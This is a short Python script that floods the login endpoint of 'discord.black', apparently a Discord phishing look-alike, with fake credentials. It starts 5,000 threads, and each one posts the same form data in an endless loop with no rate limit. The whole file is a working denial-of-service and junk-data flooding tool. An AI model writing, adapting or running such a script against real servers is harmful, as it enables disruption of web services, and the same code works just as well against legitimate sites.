import requests
import threading
from threading import Thread
import random
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}

url = 'https://discord.black/index.php?/login/='


data = {

' csrfKey': '18548ea8f1b8eeadd0caae496dabf7c1',
'ref': 'aHR0cHM6Ly9kaXNjb3JkLmJsYWNrLw==',
'auth': random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + random.choice("1234567890poiuytrewq") + ' @is.epic',
'password': 'gfyguhvgyfguh',
'_processLogin': 'usernamepassword',


}


def do_request():
    while True:
      feedback = requests.post(url, data=data, headers=headers)
      print(feedback)


if __name__ == '__main__':
    for i in range(5000):
     Thread(target = do_request, daemon = True).start()
